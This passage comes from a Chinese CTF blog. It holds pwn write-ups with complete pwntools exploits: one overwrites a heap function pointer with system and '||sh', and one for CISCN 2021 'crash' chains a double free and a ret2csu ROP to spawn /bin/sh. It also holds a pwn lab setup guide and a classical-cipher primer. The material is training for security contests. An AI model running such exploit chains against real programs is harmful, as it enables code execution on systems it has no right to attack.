class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">libc_start_main = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,p32(<span class="number">0x804862B</span>)+p32(libc_start_main))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x18550</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system)+<span class="string">b&#x27;||sh&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="CISCN-2021-西南赛区-crash"><a class="header-anchor" href="#CISCN-2021-西南赛区-crash">¶</a>CISCN 2021 西南赛区 crash</h3>
<p>这个题和HCTF的fheap，不能说是完全相同，只能说是一模一样了，但当时只有两个队做出来</p>
<p>这道题在网上的解法一般都是UAF，这里提供一种double free + ret2csu 的思路</p>
<h4 id="程序分析"><a class="header-anchor" href="#程序分析">¶</a>程序分析</h4>
<p>ADD</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+20h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give data size:&quot;</span>);</span><br><span class="line">  nbytes = (<span class="keyword">int</span>)getInt();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, buf, nbytesa);</span><br><span class="line">      *(_QWORD *)ptr = dest;</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeLong;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(ptr, buf, nbytesa);</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeShort;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">4</span>) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)&amp;Strings + <span class="number">4</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;Strings + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">        qword_2020E8[<span class="number">2</span> * i] = ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      (*((<span class="keyword">void</span> (__fastcall **)(<span class="keyword">char</span> *))ptr + <span class="number">3</span>))(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>freeLong 的汇编代码如下， freeShort 和 它差不多都存在UAF</p>
<p><img src="http://static.zybuluo.com/hgggg/mk8t3gtc5l76hghd8wst9ent/36.png" alt="36.png-28.6kB"></p>
<p>主要的漏洞点在Delete</p>
<p><img src="http://static.zybuluo.com/hgggg/0kdpfqzbu2bg4gev9rppwe3w/37.png" alt="37.png-48.5kB"></p>
<h4 id="利用方式"><a class="header-anchor" href="#利用方式">¶</a>利用方式</h4>
<pre><code>    IDA 中可以看到 call puts 与 freeShort 和 freeLong在同一
页，这样的话如果我们可以利用double free覆盖freeLong的地址的后两位
为call puts的地址,当我们delete的时候就会调用call puts 打印出字符
串地址开始的内容，call puts 的地址就在这串内容里，这样可以泄露程序
基址。

拿到程序地址之后就可以结合double free 利用delete的里溢出来ret2csu

bss段没有足够的空间来写入/bin/sh所以要往data段写
</code></pre>
<p>具体不多说(<s>主要是懒</s>)：直接上exp</p>
<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>##参考链接<br>
<a href="https://blog.csdn.net/qq_35429581/article/details/78231443">https://blog.csdn.net/qq_35429581/article/details/78231443</a><br>
<a href="https://www.cnblogs.com/luoleqi/p/12343147.html">https://www.cnblogs.com/luoleqi/p/12343147.html</a><br>
<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
        <tag>glibc堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门之环境搭建</title>
    <url>/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1>VMware下的ctf(pwn)入门环境搭建</h1>
<h2 id="工具"><a class="header-anchor" href="#工具">¶</a>工具</h2>
<p>VMware15</p>
<p>unbuntu20.0镜像 下载地址：</p>
<pre><code>http://mirrors.163.com/ubuntu-releases/20.04/
</code></pre>
<p>详情请见https://blog.csdn.net/weixin_44169941/article/details/109263134</p>
<span id="more"></span>   
<h2 id="pwn环境搭建"><a class="header-anchor" href="#pwn环境搭建">¶</a>pwn环境搭建</h2>
<p>1.安装vscode</p>
<pre><code>直接在Ubuntu software 安装就行
</code></pre>
<p>2.安装gcc</p>
<pre><code>sudo apt install gcc
gcc --version  
</code></pre>
<p>3.配置32位环境</p>
<pre><code>sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt install build-essential
sudo apt install gcc-multilib
</code></pre>
<p>4.安装vim</p>
<pre><code>sudo apt install vim
</code></pre>
<p>5.安装git</p>
<pre><code>sudo apt install git
</code></pre>
<p>6.安装pwntools</p>
<pre><code>sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
sudo python3 -m pip install --upgrade pip
sudo python3 -m pip install --upgrade pwntools
</code></pre>
<p>7.安装pwndbg + pwngdb 联合调试环境</p>
<p>pwngdb</p>
<pre><code>cd ~/
git clone https://github.com/scwuaptx/Pwngdb.git 
cp ~/Pwngdb/.gdbinit ~/
</code></pre>
<p>pwndbg</p>
<pre><code>git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
</code></pre>
<p>联合使用</p>
<pre><code>vim ~/.gdbinit
注释掉第一行 然后在第二行写入
source ~/pwndbg/gdbinit.py
</code></pre>
<p>食用方法汇总（持续）</p>
<pre><code>1.带源码调试: gdb -q [file] -d [path]（默认为.）
2.下断点: b address
3.运行: r
4.继续: c
5.运行下一步: ni
6.打印链接库: vmmap
7.输出libc_base: libc
8.查看堆: heap，parseheap
9.查看bins: bin
10.查看address处的内存 x /nxg adress
11.打印地址/指针：p address
12.查看栈：stack length
13.查看地址：telescoope address
14.查看hex: hex address
15.格式化字符串偏移地址: fmtarg 
</code></pre>
<p>8.安装docker</p>
<pre><code>sudo apt install docker.io
</code></pre>
<p>9.安装seccomp-tools</p>
<pre><code>sudo apt install gcc ruby-dev
gem install seccomp-tools
</code></pre>
<p>10.安装one_gadget</p>
<pre><code>sudo gem install one_gadget
</code></pre>
<p>11.安装LibcSearcher</p>
<pre><code>sudo pip3 install LibcSearcher
sudo pip3 install -U LibcSearcher
</code></pre>
<p>12.安装main_arena_offset</p>
<pre><code>git clone https://github.com/dev2ero/py_main_arena_offset.git
cd py_main_arena_offset
sudo python3 setup.py develop
</code></pre>
<p>食用方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pymao <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_offset))</span><br></pre></td></tr></table></figure>
<p>13.安装本地调试不同版本的libc环境</p>
<p>glibc-all-in-one</p>
<pre><code>git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one
python3 update_list
cat list
 ./download [libc-version]
</code></pre>
<p>patchelf</p>
<pre><code>git clone https://github.com/NixOS/patchelf.git
cd patchelf
sudo apt-get install autoconf automake libtool
./bootstrap.sh
./configure
make
sudo make install
</code></pre>
<p>食用方法</p>
<pre><code>patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]
patchelf --set-interpreter [libc-ld-path] [elf]
cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug
gdb [elf]
# set debug-file-directory ./debug/
如果要debug不同版本的libc的程序具体可以看这篇博客：https://bbs.pediy.com/thread-254868.htm
如果上述博客中方法不可行，则可以修改~/pwndbg/pwndbg/symbol.py 最后两行为set_directory('./debug/')
</code></pre>
<p>14.安装并配置python2</p>
<pre><code>#安装
sudo apt install python2 
#设置优先级
sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1 
sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 2
#手动切换
sudo update-alternatives --config python
#安装pip及依赖
sudo apt install  python-dev git libssl-dev libffi-dev build-essential
sudo apt-get install curl
sudo curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python get-pip.py
pip install pwntoola
</code></pre>
<p>15.安装alpha3</p>
<pre><code>git clone https://github.com/TaQini/alpha3.git
cd alpha3
python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot; &gt; out.bin
</code></pre>
<p>16.搭建docker用的镜像</p>
<pre><code>https://github.com/DASCTF-Base
</code></pre>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>pwn笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>古典密码</title>
    <url>/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1>Crypto入门之古典篇</h1>
<h2 id="1-古典密码概述"><a class="header-anchor" href="#1-古典密码概述">¶</a>1.古典密码概述</h2>
<blockquote>
<ul>
<li>古典密码是密码学中的其中一个类型，其大部分加密方式都是利用<em><strong>替换式密码</strong></em> 或 <em><strong>移项式密码</strong></em>，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。</li>
</ul>
</blockquote>
   <span id="more"></span>
<p>古典密码通常极容易破解，大部分经典密码都很容易受到唯密文攻击法攻击（cipher text only attack）。而像凯撒这种密钥数有限的密码则容易受到爆破密钥的方式破解，替代式密码有比较大的密钥数，但是容易被频率分析，因为每个密码字母各代表了一个明文字母。多字母替代式密码密码，像是维吉尼亚密码使用多个替换防止了简单的频率分析，然而，更先进的技术卡西斯基试验就可用来破解这类密码。<br>
所以，在主流的CTF比赛中，一般不会把某种古典密码作为一个题目的核心知识点来考，在比赛中遇到时，一般在搜索引擎中搜索就可以解决。</p>
<h2 id="2-编码"><a class="header-anchor" href="#2-编码">¶</a>2.编码</h2>
<h3 id="2-1-base编码"><a class="header-anchor" href="#2-1-base编码">¶</a>2.1 base编码</h3>
<pre><code>Base64
    Base64是目前网络上最常见的用于传输8bit字节码的编码方式之一，是一种基于64个可打印字符来表示二进制数据的方法。在编码时，3个字节的数据先后（先来的字节占高位）放入一个24位的缓冲区，数据不足3字节时则用0来补足。每次选出6bit按照其值来选择 &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; 中的字符作为编码输出，若原数据长度len mod 3 = 1 则在编码后加两个&quot;=&quot;,若len mod 3 =2 则加一个&quot;=&quot;,而当刚好为3的倍数时则不会出现等号，如下图。从下图中不难发现当原数据长度不为3的倍数时，在编码时会再末位补0使其成为6的倍数，而在解码时会自动去掉所补的0，如果在编码的时候不全用0位填充而将我们想隐藏的数据放入其中，也并不会影响编码的结果，这就引出了另外一个CTF题型：Base64隐写。
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/088gcrbndggz0d84gpzhfe19/20191230221011783.png" alt="20191230221011783.png-15.6kB"><br>
<img src="http://static.zybuluo.com/hgggg/mluejayhvknagd7w429ope1h/20191230221143554%20%281%29.png" alt="20191230221143554 (1).png-15.2kB"><br>
<img src="http://static.zybuluo.com/hgggg/d87dlk5xkqgua437bou3wyt2/20191230221118387.png" alt="20191230221118387.png-14.3kB"></p>
<pre><code>其它Base编码
    除了Base64以外，Baes32和Base16也是较为常见的Base编码，它们的编码原理和Basa64一样，后者Base16也是我们常说的Hex编码即16进制，除此之外还有Base58、Baes36、Base91、uuencode、xxencode等也曾出现在CTF的比赛中，它们原理类似，只不过它们使用的码表不同，而在比赛中也常有替换码表的Baes题目。
</code></pre>
<h3 id="2-2-其他常见编码"><a class="header-anchor" href="#2-2-其他常见编码">¶</a>2.2 其他常见编码</h3>
<pre><code>ASCII码：包含大小写字母，数字，常见符号等，是互联网通用语言
摩斯电码：由点（.）、划（—）组成
URL编码：又称百分号编码、只是简单的在特殊字符的各个字节前加上%
jjencode&amp;aaencode:针对JS的编码方式，前者将JS代码转为符号和字符串、后者将之转换为常用网络表情
一般地，编码只是对原始数据进行一定地处理，使其变得方便传输、储存等操作，并不是为了加密信息，也没有密钥等额外信息，只要知道编码方式就可以还原得到数据内容。
</code></pre>
<h2 id="3-单表替换密码"><a class="header-anchor" href="#3-单表替换密码">¶</a>3.单表替换密码</h2>
<h3 id="3-1单表替换原理"><a class="header-anchor" href="#3-1单表替换原理">¶</a>3.1单表替换原理</h3>
<pre><code>单表代换是指英文字母在进行密码编码替换的时候，有一张对照表，也就是说，对于每一个字母，都是唯一对应的。
例如源字母表为：abcdefghijklmnopqrstuvwxyz
码表为：qwertyuiopasdfghjklzxcvbnm
</code></pre>
<p>加密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#s为码表,m为密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,s</span>)&#123;</span></span><br><span class="line"><span class="function">    <span class="title">c</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">i</span> <span class="title">in</span> <span class="title">range</span> (<span class="params"><span class="number">0</span>,<span class="built_in">len</span>(<span class="params">m</span>)</span>):</span></span><br><span class="line">        k = <span class="built_in">ord</span>(m[i])-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        c += s[k]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,s</span>):</span></span><br><span class="line">    t = <span class="string">&quot;&quot;</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        t = c[i]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> t==s[k]:</span><br><span class="line">                m += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+k)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h3 id="凯撒密码"><a class="header-anchor" href="#凯撒密码">¶</a>凯撒密码</h3>
<pre><code>凯撒密码是一种最为简单的替换密码，即字母表上的所有的字母向一个方向偏移n位后被替换为密文，如：当n=2时，A就被替换成了C，凯撒及其变种经常会出现在CTF古典密码学的题目中，其加解密公式为：
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/fyyuo0q5dhv857h3n7ga45ap/123456.png" alt="123456.png-10.7kB"></p>
<pre><code>    由此可以看出，当我们知道一串密文是由凯撒加密得来的时候，即使我们不知到密钥，也可以通过穷举法轻易的破解。
</code></pre>
<h3 id="仿射密码（Affine-cipher）"><a class="header-anchor" href="#仿射密码（Affine-cipher）">¶</a>仿射密码（Affine cipher）</h3>
<pre><code>仿射密码作为一种单表替换密码，码表的每个字母相应的值使用一个简单的数学函数对应一个数值
其加解密公式如下：
</code></pre>
<p>加密：<img src="http://static.zybuluo.com/hgggg/ipwe3sgrjdy67i3wrq742axh/123456%20%282%29.png" alt="123456 (2).png-2.8kB"><br>
解密：<img src="http://static.zybuluo.com/hgggg/mrl6gjagmgqzmwfwp9r8rc4t/123456%20%283%29.png" alt="123456 (3).png-3.1kB"><br>
乘法逆元求法：<img src="http://static.zybuluo.com/hgggg/xw1my1dv05jobvaaocdtgzyd/123456%20%284%29.png" alt="123456 (4).png-1.8kB"><br>
<em><strong>关于公式</strong></em></p>
<pre><code>a与m互素，m=26,x为原文，b为偏移量
</code></pre>
<p><em><strong>关于乘法逆元</strong></em></p>
<pre><code>    例如，求5关于模14的乘法逆元：14=5*2+4，5=4*1+1说明5与14互素，存在5关于14的乘法逆元。1=5-4=5-(14-5*2)=5*3-14因此，5关于模14的乘法逆元为3。
</code></pre>
<p><em><strong>破解</strong></em></p>
<pre><code>若a=1,则刚好就是凯撒密码。
若a!=1,我们可以知道m=26，a与m互素，即可得到的取值范围为：1，3，5，7，9，11，13，15，17，19，21，23，25中的一个，所以一共有12*26=312种可能的密钥，此时采用穷举法即可攻击。
若我们已经知道了两个加密后的字母c1,c2。那么通过公式c1 = a(x1+b) mod m ; c2 = a(x2+b) mod m;则c1-c2可得：c1-c2=a(x1-x2) mod m即可求解a，再用穷举法得到b。
</code></pre>
<h2 id="4-多表替换密码"><a class="header-anchor" href="#4-多表替换密码">¶</a>4.多表替换密码</h2>
